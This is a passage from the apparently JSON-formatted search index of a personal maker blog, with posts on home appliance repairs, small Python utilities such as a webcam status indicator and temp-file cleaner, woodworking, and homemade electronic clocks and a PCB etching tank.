Atmega!\n\u0026#39;Antenna\u0026#39;\nI can\u0026rsquo;t imagine that \u0026lsquo;antenna\u0026rsquo; works very well. If you had a large house, this thing would probably need to be in the kitchen. But anyhow, it now works, and doesn\u0026rsquo;t reboot no matter how hard I press the buttons. Now to see how long it lasts.\n","permalink":"https://2e0byo.github.io/post/repairs/thermostat/","tags":null,"title":"Thermostat"},{"categories":["Repairs"],"contents":"My microwave went on the blink, a few days before I got married. It started turning itself on, randomly, as soon as it was plugged in. You could use it\u0026mdash;I did in fact use it\u0026mdash;by putting something inside, waiting for it to turn on, and then opening the door after the required time had elapsed. Hardly ideal. I unplugged it and left it for later\u0026mdash;there were other things to think about after all\u0026hellip;\nFast forward a few months, and not having a microwave in one’s married home is getting annoying. I don’t use it much (and my wife hardly uses it at all), but it is easier to make hot chocolate in, and I will stoop to cooking peas in it as well. And reheating coffee. Thus, time to take it all apart. (Last time I did this it was the cancel switch. Plus ça change\u0026hellip;)\nHere is the whole thing poked and prodded till we can get at the front board:\nand then, as before, to remove the offending switch and replace it with another, which I cut to size from another old board as I don\u0026rsquo;t stock these things:\nBefore\nAfter\nWhilst I was at it I fitted something all microwaves should have\u0026mdash;a potentiometer in series with the piezo speaker:\nSquashed in the front\nBliss!\nNow I can turn it down. After years of being bothered by beepy self-important electronics, I can finally get some peace\u0026hellip;\n","permalink":"https://2e0byo.github.io/post/repairs/microwave-repair-and-volume-control/","tags":null,"title":"Microwave Repair and Volume Control"},{"categories":["Coding"],"contents":"There are lots of anti-rsi packages out there for windows. I even found a few for Linux. None did what I wanted them to do: to enforce short and long breaks at configurable intervals, allowing me to push them back when I was in the middle of something, but getting increasingly insistent that I actually took them.\nEnter anti-rsi, a python script which does everything an anti-rsi package needs to do and nothing more. It can be paused, resumed, postponed, and forced to run early. It uses some idleprinter (xprintidle) to keep track of when the computer isn’t in use and pause itself. It logs the total time it considers that the system has been in use. Communication is by unix signals, which is a bit naughty, but I found enough. It will output usage when sigpolled to /dev/shm/usage, which I then pickup with a wrapper script for i3status. It also logs, and I run a few services to conglomerate all these logs onto the main workstation and generate a nice pretty graph of them with the wonderful mlpd3 which \u0026lsquo;brings matplotlib to the browser\u0026rsquo;.\nThere are many possible improvements, but I wrote this a few years ago and it’s been in use ever since.\n","permalink":"https://2e0byo.github.io/post/coding/anti-rsi/","tags":null,"title":"Anti Rsi"},{"categories":["Computing"],"contents":"Currently we are all stuck in front of webcams, at least half the time. I do have a laptop\u0026mdash;a gift from a kind friend\u0026mdash;and it does get used, but the rest of the time I am sitting before two old monitors (one of which recently had to be repaired) and a lovely cherry keyboard: and no webcam. No matter: I’ve a cheapo usb-thing and it works fine. I’ve also an old phone handset from an 80s landline wired into two 3.5mm jacks\u0026mdash;it had an electret microphone and works fine. It gets laughs on zoom, but it’s easier to pick up and put down than a headset, and I can hear if anyone’s creeping up behind me.\nProblem: the el-cheapo usb camera is permanently on when plugged in. And crawling down behind the computer to plug it in isn’t really an option. Worse, it has no status indicating light. Now I’m not that paranoid\u0026mdash;if the NSA wants to see me in jumpy 640x480 frames, they can probably get at my webcam. I doubt they care much. But still, not knowing whether one’s webcam is on is a little unsettling\u0026hellip;\nIt’s a usb device, so the first thing to look at is /sys. A quick google suggested that first we need the bus and port ID, and then we can bind and unbind a driver by writing to /sys/bus/usb/drivers/unbind. Thus:\ndef get_webcam(): \u0026#34;\u0026#34;\u0026#34;Get webcam usb.\u0026#34;\u0026#34;\u0026#34; cameras = [] for product in Path(\u0026#34;/sys/bus/usb/devices\u0026#34;).glob(\u0026#34;*/product\u0026#34;): if \u0026#34;camera\u0026#34; in product.read_text().lower(): cameras.append(str(product).split(\u0026#34;/\u0026#34;)[-2]) return cameras Liable to have false positives if a digital camera is plugged in, but better safe than sorry (don’t go running --disable unless you’re sure only one webcam is attached\u0026hellip;)\nand then something like:\ndef disable_webcam(webcam: str): with Path(\u0026#34;/sys/bus/usb/drivers/usb/unbind\u0026#34;).open(\u0026#34;w\u0026#34;) as f: f.write(webcam) To query the status, we can look to see if 1. any webcams are found and 2. they have a bound driver. I run i3 and use i3status with a python wrapper script as per the docs to display the status of redshift and the amount of time I have spent typing at the computer that day, from my anti-rsi package. Thus it was easy enough to add another function:\ndef webcam_status(): webcams = get_webcam() statuses = [] for webcam in webcams: if webcam: status = get_webcam_status(webcam) if status: statuses.append((\u0026#34;R\u0026#34;, red)) else: statuses.append((\u0026#34;\u0026#34;, green)) else: statuses.append((\u0026#34;O\u0026#34;, orange)) return statuses where the colours are html codes defined elsewhere. This is then injected into the json:\nfor webcam, colour in webcam_status(): j.insert(0, {\u0026#34;full_text\u0026#34;: webcam, \u0026#34;name\u0026#34;: \u0026#34;webcam\u0026#34;, \u0026#34;color\u0026#34;: colour}) and if the webcam is recording, a red ‘R’ appears in the status line.\nI’m sure there are ways to trick this, but the kind of access you’d need to the system to be able to rename a usb device or access it without the kernel knowing a driver had been bound (or indeed, just replace my wrapper.py) is probably more than I care to defend against anyhow.\nThe script is up on GitLab if anyone else has need of it.\n","permalink":"https://2e0byo.github.io/post/computing/webcam-on-and-off/","tags":null,"title":"Webcam on and Off"},{"categories":["Carpentry"],"contents":"Background This workbench is built almost exactly to a published design and following the videos. One has to buy the videos. This is the first time I have ever done anything like this, and it was a very good idea. Buy them; watch them; copy them. Unless one is very lucky one simply doesn’t get to watch a good craftsman up close very often, but the ability to pause, zoom, replay, and see exactly how to position your hands and body when paring with a chisel, for example, is worth any amount of textbooks.\nNotably:\nit\u0026rsquo;s made from pine. Pine, apparently, has the advantages (besides being cheap) of gripping better, being lighter, and not mattering. So you can put a nail in it to hold a workpiece in place and not worry. stability comes not from weight, but from the massive (6\u0026quot;) front apron and its dovetails the front dovetails are made with a gap (about 1/16\u0026quot;) to allow for movement in the timber. (This makes sense as the notched edge is what provides the bracing, and the apron will get deeper rather than longer with moisture). That said I’ve changed a few things. I have a small shed, so the bench had to be small\u0026mdash;6’ in length, not the enormous 12’ of that design. Likewise, it is only 2’ deep. I have a record quick-release vice I found cheap on Ebay, so that went in instead of the wooden screw and handmade vice here. I couldn’t get 4x4s for the legs, so mine are laminated up from 2x4s; and I bought all of the timber rough sawn to force me to get efficient at planing up stock.\nFrame First, we need some timber. I took the trolley along to B\u0026amp;Q, simply because it is just around the corner and I knew of nowhere else, and bought what I could find: a lot of 2x4s, some 1x8 planks, and some CSL to make up a pair of sawhorses.\nI had a few days before the PhD began, so finishing was always a bit unlikely. But first off we need some sawhorses. I made this design up late at night:\nIt\u0026rsquo;s a bad idea, as the legs are far too far apart, but it does work.\nThen to nail down the planks temporarily and cut the legs:\nand plane them flat and square (we\u0026rsquo;ll dimension them later when glued up):\nHere is my first attempt, which took about an hour:\nIt needed the screws to pull it in, and even then there were some cracks. It turns out from watching the vides there is just oh so much I didn\u0026rsquo;t do correctly: plane at a silly angle, not flush with the wood, and no idea how to take out the high spots, lightly cup the surface and then finish off flush. Really, buy the videos and watch them\u0026mdash;they\u0026rsquo;re excellent. But anyhow, on my third attempt, and after slightly cupping the glued faces to achieve perfection, there was barely any visible line at all:\nand side by side the difference is obvious:\nSo now they could all be glued up:\nBy this point I was very unwell with something or other, and the PhD was starting in a few days. The workbench sat unloved on the trestles in the shed for the best part of a year, until it was turned into an excellent bench under the motivational training of government functionaries; of which more in part 2\n","permalink":"https://2e0byo.github.io/post/carpentry/workbench/","tags":["Lockdown"],"title":"Workbench: first shot"},{"categories":["Coding"],"contents":"What does one do with temporary files? For things one really doesn’t need, there’s /tmp, which is wiped on boot\u0026mdash;though sometimes it’s a ramdisk, and one should be wary of dropping large files into ramdisks. But what about e.g. downloaded isos, pdfs prepared for printing, and the like? Things one needs now, might need tomorrow, but definitely won’t need in a year’s time?\nLike most people I used to use ~/Downloads and go through it (with ncdu) every time it got too large. But this isn’t really satisfying: one can accumulate thousands of files each only a megabyte in size. I considered using cron to wipe downloads ever so often, but sometimes one wants to keep things.\nThe solution is a dedicated directory, ~/volatile-tmp though you can call it what you like, and a script which scans it every day and deletes everything older than some epoch. Whilst one could do this directly with find, I threw together a python script which just globs the tmpdir. Thus subdirs can be handled the way (after a lot of thinking) I think they should be: any tree below ~/volatile-tmp has the age of the youngest member at any depth (and we only recurse by one level, to avoid deleting bits of projects). If need be the life of a particular dir can be extended by dropping a file named .volatile-tmp in it, or it can be preserved by touching .preserve.\nWhen I was at school I put all the paperwork they give you\u0026mdash;worksheets, letters, etc\u0026mdash;in a big box marked volatile, and every month threw away the bottom half. Thus the probability that I could find a particular piece of work diminished logarithmically as time went on. If you use a backup system like backintime then files have a similar half-life: as older backups are purged (and I don’t exclude ~/volatile-tmp from backup) the chance of finding a file dwindles to nothing. So if it goes today and you need it tomorrow it should be findable, but in two years\u0026hellip; which fits the original picture quite nicely.\nI call the script from a systemd unit, but cron would work just as well. Code (and an installation script) is on gitlab and it’s been running for a year or so now: my ~/volatile-tmp is at time of writing only 46M in size\u0026mdash;and I use it a lot.\n","permalink":"https://2e0byo.github.io/post/coding/volatile-tmp/","tags":null,"title":"Volatile Tmp"},{"categories":["Coding"],"contents":"I wrote this a while ago, and it’s been in use ever since: a very simple script which counts down (or up) while printing the remaining time. Controlled with standard job control, it’s one up on sleep as you can see how long is left. This is occasionally handy; if I only have ten seconds on the clock before lunch I’ll not start something new, but if I’ve got fifteen it might make sense.\nWhen elapsed, it exits. So chain it:\ncountdown.py 10m \u0026amp;\u0026amp; tput bel \u0026amp;\u0026amp; notify-send \u0026#34;Elapsed!\u0026#34; Better still, just drop that in an alias.\nCode is on gitlab but you could probably write it in the time it took you to read this. So I wonder why no such basic utility seems to exist in the package managers?\n","permalink":"https://2e0byo.github.io/post/coding/cli-countdown-timer/","tags":null,"title":"CLI Countdown Timer"},{"categories":null,"contents":"Wordpress is a glorious conglomeration of PHP which works very well, PHP which works poorly and PHP which doesn’t work at all. The former is generally written by the Wordpress developers, the next by me, and the latter by me after around 11pm.\nThis website existed for a while on wordpress.com. It was the natural choice: everyone uses wordpress to manage blogs, and this is little more than a blog. On the other hand, writing in a web browser is irritating (writing is what text editors are for) and does one really need the whole wordpress architecture to serve a lot of static pages and images? Wordpress.com won’t even let you install plugins on the free tier, so it’s not like I was doing anything with all that dynamic ability anyhow.\nEnter gitlab pages and Hugo. Gitlab, not Github, simply because all my repositories are already there (back in the day gitlab offered unlimited private repositories, which was very attractive). Hugo because 1. it’s shockingly fast and 2. it’s written in Go, and I know nothing about Go; how better to find out? Update: we are now on github pages. Serving is slightly faster; Github Actions I actually know (unlike gitlab), and the hugo action is written in typescript, so it doesn\u0026rsquo;t need to pull a docker container, which speeds up deploys.\nThus, this site is now written very largely in markdown, in Emacs or Vim as the fancy takes me, pushed to a git repository, and appears magically here online. And it now uses no cookies, no bloat, and no server-side code at all. Which might encourage me actually to write for it, since writing is as easy as running hugo new post/date-title.md, opening said file in an editor, committing and pushing.\n","permalink":"https://2e0byo.github.io/post/2020-09-28-leaving-wordpress/","tags":[],"title":"Leaving Wordpress"},{"categories":["Repairs"],"contents":"My father’s electric shaver wasn’t holding charge; he asked if I could have a look at it and see if the internal battery could be replaced. Here’s the exploded view:\nThe green battery is a NiMH, not NiCad as I\u0026rsquo;d expected. I suppose it\u0026rsquo;s not that old. Which is as well, as I couldn\u0026rsquo;t find any NiCads in the drawer when hunting around before, and was planning on gutting it and fitting a LiPo battery and tiny charging module.\nI wasn\u0026rsquo;t sure what the battery would turn out to be, but it\u0026rsquo;s actually just a single 1.~5V cell, with a little \u0026lsquo;battery manager\u0026rsquo; through-hole IC which implements a current-regulated SMPSU directly from the mains feed in the base. The waveform was not very pretty:\nBut then it might well be sampling the cell voltage in the troughs (sampling in the peaks is a good deal less reliable, particularly if charging at anything approaching C).\nThe question was: would a standard AA fit? That cell looks AA sized:\nHmm. Probably. And whilst we\u0026rsquo;re at it, would it work?\nYes, it charged and held charge this time. Still, that cell\u0026rsquo;s quite old and I don\u0026rsquo;t know how well it will last.\nThen to cut down a battery pack, as I had no single AA holders and it needs to be small:\nand mount it to the board with little bits of wire, and cut away most of the battery-supporting superstructure in the case to allow enough space:\nAnd then try to get it back together. It was a bit of a squeeze, and I think I might need to bend the front switch contacts back a bit to decrease resistance when it next needs opening, but it works, and holds charge for a good while longer than before. (Update: a few months down the line it doesn\u0026rsquo;t really hold charge any more. Oh well. There are plenty more NiMHs in the cupboard: one is bound to be good. And at least it\u0026rsquo;s a standard battery now.)\n","permalink":"https://2e0byo.github.io/post/repairs/shaver-repair/","tags":["Lockdown"],"title":"Shaver Repair"},{"categories":["electronics"],"contents":"This was a sudden impulse last summer: I\u0026rsquo;d seen a \u0026lsquo;sunrise\u0026rsquo; alarm clock (which fades on slowly to simulate sunrise, theoretically bringing you out of deep sleep naturally and waking you up gently). My sister mentioned having difficulty getting up and needing multiple alarm clocks. Ergo.\nFirst thought: where to get the light? I had a look in the LED parts draw, but it was disappointing, as was the draw of old led torches and bike lights. None of them gave a reasonable light: more like a little pin-prick than the sun. So off down the road to the bricolage shop (or bric-a-brack as we call them) and I came back with this:\nIt\u0026rsquo;s a standard \u0026lsquo;40W equivalent\u0026rsquo; \u0026lsquo;golf-ball\u0026rsquo; led bulb. I\u0026rsquo;ve started prying off the BNC cap, as you can see. Here are the internals:\nTop is power in. It goes directly to the bridge rectifier (bottom right). Ater that is a chip capacitor in parallel with an electrolytic, and then the voltage is fed directly to the regulator IC, top left. Below the regulator IC is a pair of paralleled current sense resistors, which set the output current. The output of the IC directly feeds the LEDs.\nNote what is not there: there\u0026rsquo;s no EMC protection anywhere (lower power devices are frequently exempt—unfortunately). One of the wires connecting the board to the cap has a fusible resistor inline; this is all the protection it gets. I expect the IC has overvoltage protection. There\u0026rsquo;s no inductor or LED-side smoothing: I suppose the \u0026lsquo;regulator\u0026rsquo; just does crude PWM directly on the mains input, which probably shortens LED life. Disappointingly, the regulator datasheet does not mention anything about a PWM input to control brightness, which some of these ICs have. I\u0026rsquo;d hoped to get lucky; oh well.\nWhat happens, then, if we take the current sense resistors out of line? Theoretically this should result in the IC supplying no current at all. In practice, it results in the LEDs glowing very dimly. Putting various different resistors in here confirms we can control brightness from \u0026lsquo;very dim\u0026rsquo; to \u0026lsquo;very bright\u0026rsquo;, although it\u0026rsquo;s still only a \u0026lsquo;40w\u0026rsquo; bulb. The next step was to try PWM by switching the original low value resistors with a mosfet (bonding the floating ouput of a bench power supply with the IC\u0026rsquo;s internally generated vcc). For this the Pic Development Board was used. First tests were successful, so I went hunting for an optoisolator, and tried using that instead of the mosfet. It worked (a slightly lower resistor was needed, I seem to remember, to get the same maximum brightness). I also found an old wall-wart 5v SMPSU and took the board out, and a 5v relay on a board saved from an old washing machine. Putting this all together on one bit of ply with the PIC, some buttons, and a 16x2 LCD we get this:\nThis setup lets me turn the lamp on (with the relay), and then increase its brightness (by PWM accross the sense resistor connections). A tad ugly, but it works. Then to mount the optoisolator properly on the lamp:\nAnd box up the mains side of the breadboard for safety:\nThe lamp cover was later glued back on, and a piezo buzzer added for a backup alarm. The next question was the clock: I had no RTCC (RealTime Clock/Calendar) modules on hand, and whilst they\u0026rsquo;re very cheap, this was supposed to be a quick project. I do have a stock of old digital alarm clocks, which I tried to use to auomate things as a boy by replacing their piezo buzzer with an amplifier + latch + monostable which would short out a transistor accross my laptop power supply, turning it on so it would be booted by time I got up, and I could practice Morse Code. I never got the bistable latch working properly and consequently never learnt Morse properly. One of these, with the buttons shunted with transistors and the piezo taken to an analogue input on the PIC could theoretically function as an RTCC. But after all the PIC has a clock (48MHz from an 8MHz crystal); couldn\u0026rsquo;t we do the clock in software? The PIC is running the pinguino bootloader, and in the shipped \u0026lsquo;pinguino example\u0026rsquo; files is something like this:\nvoid tick(){ // function called every second if (!stopClock) { s++; if s 59) { m = 0; h++; if (h \u0026gt; 23) { h = 0; } } } if (displayClock) { lcd.setCursor(4, 1); lcd.printf(\u0026#34;%02u:%02u:%02u\u0026#34;, h, m, s); } } } void setup() { // put your setup code here, to run once: OnTimer0(tick, INT_MILLISEC, 993); } The value is somewhat less that 1,000ms as the PIC\u0026rsquo;s clock is not terribly precise (although it is accurate: it shouldn\u0026rsquo;t drift). As you can see, Pinguino is an Arduino clone running on PICs. This stuff is great for throwing something together; it\u0026rsquo;s less great for squeezing the last 5% out of a low-powered MCU. It\u0026rsquo;s also not very actively developed and the \u0026lsquo;ide\u0026rsquo; is a nuisance which plays poorly with tiling window managers. But somebody else has done the work, so I shan\u0026rsquo;t complain. That\u0026rsquo;s also bad C and bad MCU writing, but that\u0026rsquo;s largely my fault.\nThe rest of the code is very easy: we need to check for alarms (a simple flag in the tick() ISR is fine), write the time, and fade over periods. Everything was done asynchronously, which works—providing the lcd isn\u0026rsquo;t being written to when the ISR triggers and starts writing, or else it prints nonsense. This race condition bug is embarassing, but it took ages for it to occur (luck) so I didn\u0026rsquo;t think of it until rev. 2.\nThe lamp was PWM controllable by the end of one day, and the pic was behaving itself the day after. A competent MCU programmer could have thrown the whole thing together in an hour. Here\u0026rsquo;s a rather blurry pair of photographs showing a test, on the left of the lamp, and on the right of the clock\u0026rsquo;s rate.\nThe hardware has been in use since the summer, and has apparently had a noticeable impact on how quickly my sister wakes up, so that\u0026rsquo;s something\u0026hellip; No code online as it has been entirely rewritten.\nAddendum: Case Eventually I got round to making a basic hardboard box to put the lamp in. Here it is, looking a little more like a real lamp:\n","permalink":"https://2e0byo.github.io/post/electronics/clocks/quick-sunrise-alarm-clock/","tags":["clocks","lamps"],"title":"Quick Sunrise Alarm Clock"},{"categories":["Electronics"],"contents":"Dad rather liked my clock. In fact, he went looking for \u0026lsquo;a clock with hands and an adjustable chime\u0026rsquo;. Which, of course, made me wonder whether I could make one.\nThe first question was the hands: I liked the leds at the front of mine, and didn\u0026rsquo;t see the point in moving real hands around with a stepper motor or something of the kind. A digital clock should, I think, look digital. Looking online for things like \u0026rsquo;led ring clocks\u0026rsquo; showed the odd design, but none with all three hands in one ring, and three rings struck me as a bit much. Thus I started looking on farnell for bicolour leds to make the hands out of, and found an orange/red led on clearance at around 10p each: and also some red/green rectangular leds. Now, wouldn\u0026rsquo;t it be nice to have the \u0026rsquo;ticks\u0026rsquo; in the display differently shaped as well as coloured?\nBut how to drive it all? I\u0026rsquo;d assumed the same underlying hardware as mine, but a multiplexed display was clearly out of the question. At this point I got everything wrong: rather than googling \u0026lsquo;serial led driver ic\u0026rsquo; I set about designing my own: a set of cascaded shift registers, with the leds connected between outputs so that \u0026lsquo;10\u0026rsquo; would give red and \u0026lsquo;01\u0026rsquo; green (\u0026lsquo;11\u0026rsquo; is forbidden in software). I\u0026rsquo;d never built anything of the kind and assumed that one just wired the clocks together and the outputs to inputs; after testing on a breadboard with two ics a board was designed accordingly, aiming at being as aesthetically pleasing as possible:\nIC placement errors are cause by moving the footprint\u0026#39;s center so as to place the ics programatically with the python shell.\u0026#39;\nThis board is riddled with mistakes: the clock and latch are actually wired in rings (!), the clocks are fed in the same order as the data (and thus lag), the tolerences are rather fine, and multiple tracks are fed between ics to avoid vias. I\u0026rsquo;d never made a double-sided board before, but toner transfer worked really well for smaller boards, so why not?\nMain Board It turned out that there were other variables: the paper shrunk under heat, but I\u0026rsquo;d already ironed one side and drilled all the holes. Fortunately the tolerance was still just about on, but the other side had to be shrunk in the oven until it fitted the board, then aligned and \u0026lsquo;glued on\u0026rsquo; with the iron really quickly to make sure it lined up, and then ironed all over. There were a few failures and a lot of annoyance: just getting the toner on the pcb and the holes drilled took 2 days.\nThen there were the dropped tracks. The front was pretty good, but almost a third of the back needed touching up. For another day I went over every track with fine sharpie and magnifying glass, painting on the extra tracks:\nThen it was checked and checked again, and finally placed in the vertical etching tank at some unearthly hour of the night. When the board was cleaned it looked pretty good, but back at the bench there were broken tracks everywhere. Another day or so went to bridging them all with really tiny bits of wire painstakingly soldered on top:\nThen the resistors (0805) and the ics, and at last the final 7-seg displays to test it: The result was a complete failure. I was testing with a Pinguino board, and even with the serial timing turned far too slow to update a clock I only got random noise out. To begin with nothing came through at all: broken tracks had slipped through. Then it things came through, but bore no relation to input. Scope probes on the lines and repetitive signalling (oh for a sampling oscilloscope!) showed phase errors creeping in from about the third IC. Google, and the discovery that I\u0026rsquo;d done it all wrong.\nI cut all the clock lines and tried clocking the last two ICs individually from a schmitt trigger: they worked. So the display was divided up and two schmitt buffers (I think) wired ugly-bug on the back, alongside much larger smoothing capacitors, and capacitors were added accross the data line to decouple it. The clocks were fed backwards, and some of the dodgy tracks were replaced with wire. After two days it worked, both with the Pinguino (5v) board and, importantly, with the OpenWrt-running router:\nThen the leds could be added, to reveal further broken tracks. Then the LEDs were far dimmer than the central digits, and I cut the latter\u0026rsquo;s ground and inserted a mosfet switch for PWM, which worked fine with the Pinguino but later proved impossible to do reliably with the larger board (no integrated PWM was available, and bit-banging was too unstable, causing display flicker), so a 555 timer was added on the back of the board.\nAmplifier I\u0026rsquo;d ordered a stereo class-D board (which are now available for ~£1 on Amazon), but it didn\u0026rsquo;t come in time, so I threw together a basic op-amp-with-pushpull-pair with heavily filtered inputs, mounted in a shielded tray of pcb. It isn\u0026rsquo;t capable of much power (the output stage is bc547/557) but it does work, and since the chime has not actually been used has remained unreplaced:\nCase I spent most of the planning time trying to think up a design simple enough to be buildable in a hurry, and yet sufficient to offset the face and give the clock some grandeur. The final design is based on \u0026rsquo;the\u0026rsquo; art-deco clock, and was fairly heavily modelled to get the proportions right, but I\u0026rsquo;ve lost the file.\nWhen the perspex arrived the thicker stuff showed cracking from the bandsaw. I decided to press on regardless:\nThis time the edges were scraped with a stanley blade in lieu of filing, which worked very well, delivering clean flat edges before the flame polishing. The two smaller side pieces were cut in half by hand to save money when buying the plastic: I\u0026rsquo;m quite pleased with the accuracy. Then gluing up with superglue. Unfortunately the superglue fogged inside the cracks, and they stand out when viewed from the side. But the effect is minimal, and face on the case is exactly as designed:\nThe knob on the rear controls the brightness of the central digits.\nSoftware This clock uses a simplified, rather cleaned up version of the code running the older clock. It has a rather basic web interface which allows one to change the colour scheme used by the hands, blank the display, and adjust most of the runtime variables. The web interface is thrown together in PHP and uses a unix FIFO to communicate with the running python program; it\u0026rsquo;s rather overkill for a clock, but it works. There\u0026rsquo;s also a PHP interface to the mpd server from one of the myriad of abandoned static clients on github, although the alarm and chime functions have yet to be used. The code is once again online for those who want some amusement. This time round I used a more up-to-date version of OpenWrt, with better wifi performance, and a gpio library which seems to write better than the pseudofiles. The board can be updated in .4s, but for reliability we slow it down and take .8s. An unforseen consequence of those tiny bits of wire repairing tracks is that they act as little speakers, contracting and expanding with the data. The worst offenders were glued down, and the noise is minimal when the case is assembled.\nSince it\u0026rsquo;s been in the living room I\u0026rsquo;ve spent far too long watching for display glitches, but so far I think I\u0026rsquo;ve seen one, maximum, in a total of several hours\u0026rsquo; observation—and I may just have blinked. The chosen colour scheme minimises current consumption, but it is possible to have more blinkenlights.\nIn use, the second is easily read. For the other hands it\u0026rsquo;s quicker to read the central digits, although looking a little longer shows where they are.\nThis is easily the best clock I\u0026rsquo;ve made, and other than a possible repeat with a Raspberry Pi Zero (£10!) board driving it and updated front board, I\u0026rsquo;ve no plans for any others, at least of this kind.\n","permalink":"https://2e0byo.github.io/post/electronics/clocks/networked-clock-with-hands/","tags":["Clocks"],"title":"Networked Clock with Hands"},{"categories":["Electronics"],"contents":"I don\u0026rsquo;t much like PCBs, but I like wiring ICs up even less. Up till now I\u0026rsquo;ve made boards with the toner-transfer-and-any-old-container method. The trouble is that I hate making up ferric cholride and always make the bare minimum, and during etching the concentration falls off, the rate slows, and you get poor definition and damage. So I decided to make a proper vertical etching tank, big enough to do a large board and still not run out of etchant. Casting about the shed found a large transparent dust-sheet, and I wondered about using it for the tank. With care an unpierced section could be found, and a bag was taped together:\nAnd a chipboard frame, with viewing window, made for it: It took a while to work out how to compress the seals in the frame to keep it watertight, but in the end it was tested successfully. Then to make up enough ferric cholride for a tank of this size: a messy business when the pellets have been stored in a shed and turned into one water-glued lump. I had to cut the case apart with a hacksaw and break up the solid lump—and all this without spilling any or getting it on clothes. But in the end it worked:\nAnd etched a large double-sided board, very well under the circumstances:\nNow, how to get the etchant out? Pouring it was out of the question. I had a little siphon I made as a child for refilling ink bottles, and it got rid of some of it:\nBut not much more than that. A larger head was needed, and a longer siphon. This tube is cat-5 outer insulation, started with a syringe in the end. With care you can keep it off your hands, but the stuff isn\u0026rsquo;t that dangerous:\nAnd there we are. I do think syphons are incredible: every time I see one in action I wonder at this apparent free energy making water flow uphill.\n","permalink":"https://2e0byo.github.io/post/electronics/vertical-etching-tank/","tags":null,"title":"Vertical Etching Tank"},{"categories":["electronics"],"contents":"This project began when the noise of the ethernet switch opposite my college room became unbearable. I picked the room for the view, which was sublime: the valley falls away so steeply you can see right down, over the trees, to the river, and climbs again the far side in a steeply wooded bank over which the pigeons perform what I can only describe as buzzing runs on the squirells. In the distance, the rolling hills, at night the moon and by day the sun—morning and evening, opposite corners of the window. Sometimes the outside world would come a little closer:\nWhich could have messy consequences:\nBut in general it stayed where it was. The noise, on the other hand, invaded: it became so constant that after a few hours I had stuffed a towel under the door in a vain attempt to block it. So I tried a distraction: I already had the computer chime the quarters, so I tried making it play a tick on loop. Ticking is mildly annoying, but it masked the whine perfectly. On the other hand, having your computer double as a chiming clock is not exactly straightforward when, say, you play music or a skype call comes in. And using it as an alarm clock (I had no phone) is not exactly energy-efficient. Nor is hibernating really safe: resume errors do happen. So I wondered about a dedicated clock, which would:\nUpdate its time automatically Chime hours and quarters Play an alarm playlist at random, and handle snoozing and rescheduling Tick Resume safely from power outages This all needs some kind of computer, a soundcard, a speaker, and amplifier and a display. I don\u0026rsquo;t see myself living without an internet connection, so network time-updating is fine. I also don\u0026rsquo;t see myself implementing audio on an MPU, or sacrificing the one arm MBed I have to this kind of thing. Nor did I want to spend £30 on a raspberry pie.\nHardware In the cupboard at home were a bunch of wireless routers I\u0026rsquo;d put OpenWRT on. Google revealed that they had GPIOs which, theoretically, I could toggle from userspace just by writing to the relevant psudofile under /sys, giving an easy way to drive a display. Even better, someone had traced the location of most of the GPIOs. Over the Christmas holidays I confirmed I could toggle them and started dreaming of the front panel. It needed to show seconds, so I could set a watch by it. I had an old green vacuum flourescent display from a bose radio, complete with front glass, destined for a radio clock which never got beyond the reciever. Experiments with the display showed that it wanted about 2.5v accross the filament, and anything above 10v on the segments to turn them on. In the cupboard were a pair of red 7-seg led displays which would go nicely for the seconds.\nOver the next two terms the hardware and software took shape in my head in odd moments: I wanted to drive every segment directly so I could display text (badly); multiplexing was easier than a serial solution, and a latched multiplexer was even better as I\u0026rsquo;d no idea how reliable the os would be at bit-twiddling. A bunch of octal latches were ordered, and I put the thing out of my mind till the summer.\nBreadboard Exams came and went and summer rolled on. I got home and took one of the wireless routers out of its box and mounted it on an offcut of ply. Then I started trying to find enough GPIOs: eight for the seven segments plus dots plus six for the digits (though we could have decoded this latter, but it seemed overkill); for buttons I wired directly to the two buttons on the board after disabling their handlers. Some were quite easy, on unfitted 0805 pads. Others were harder, on SOIC pins or in odd places. I blew a few and had to sacrifice some of the LEDs to gpios, but in the end I had them all wired to a header, with the wires glued in place:\nThen the display board. The VFD needed switching transistors for each segment to handly the 12v, and a dropper from the 3.3v (a series diode in the end). I rather foolishly squeezed this all onto the only bit of large stripboard I had:\n\u0026hellip;without even planning screw holes. This board has played up over the last three years: there\u0026rsquo;s a near-short somewhere which can turn one segment on, but every time I go looking for it it disappears. We\u0026rsquo;re several months clear at time of writing.1 The multiplexers were mounted uglybug, and the resulting wiring is dependable and very ugly indeed:\nAttaching the ribbon cables, which unlike the magnet wire are quite vulnerable, was interesting:\nI wired the dots together, which gives five other outputs. Four of these control LEDs and one is unconnected. The overall schematic is fairly straightforward:\nAnd the rest of the hardware is unimpressive. Indeed, the LM386 amplifier module I had from some \u0026lsquo;soldering kit\u0026rsquo; was so underwhelming it ended up fitted with a clc psu filter in a shielded metal box, and even then it picks up annoying noise. I really should replace it.2\nThen it was just a matter of software, which I won\u0026rsquo;t go through here: the code was developed when I was too tired to do anything else and is very ugly and very very inefficient; it is also all in python to avoid cross-compiling. But it can be found on gitlab for amusement. The display writing loop takes, I think, about .4s to write all the digits, (mainly because writing the gpios via pseudofiles is quite slow), and then toggles the latch to update the display. The various modes, including a monastery bell which chimes vespers and compline, are implemented with a set of daft ideas, like defining a dictionary of functions for each button under different circumstances and implementing modes by re-writing the dictionary. But it works, with snoozing, adjustable alarms (alarms are set over ssh), modes selected by short or long presses on buttons and a fair deal of bugfixing over a year. Music is handled via mpd, since it was the only decent audio decoding package available. The clock was my only alarm clock for three years until it was (eventually) moved downstairs and supplanted by a phone, at least until I build another chiming clock for the living room.\nCase The case had to show off the clock: it was no good building something full of wires and fury (and signifying very little) if nobody could see it. That meant perspex: beyond that, the simpler the better. One can order perspex pre-cut on line, and it\u0026rsquo;s quite reasonable. After measuring the board I fixed a minimum size and ordered it: the case was several times more expensive than the clock, whose router cost £5 on ebay, soundcard £6, and the rest was junkbox parts.\nThen to mark out and cut the case:\nand draw-file and shape the edges:\nDrill—carefully. I wasn\u0026rsquo;t careful enough and one of the 6mm holes split when trying to drill both top and bottom together. But the split was small and I was planning on using penny washers anyhow:\nAnd then flame-polishing, which is much better than the brasso-and-elbow-grease method they taught at school:\nAnd we are ready to assemble:\nUnder these conditions it got rather hot, despite the ventilation holes under the cpu, so I raised the top all the way. I also had to cut a hole in the back for the usb cable to poke in and out after forgetting to allow for the cable—it was that or solder it direct to the board. But overal it\u0026rsquo;s not bad, and the colours of the panel are quite pleasing:\nOnce set up to connect to the network it takes a few minutes after powering up to synchronise time. A script monitors the wifi connection and toggles it or reboots the clock if it goes down for too long, as it can drift quite fast without correctiong. It was a talking-piece the two years I lived in college, most 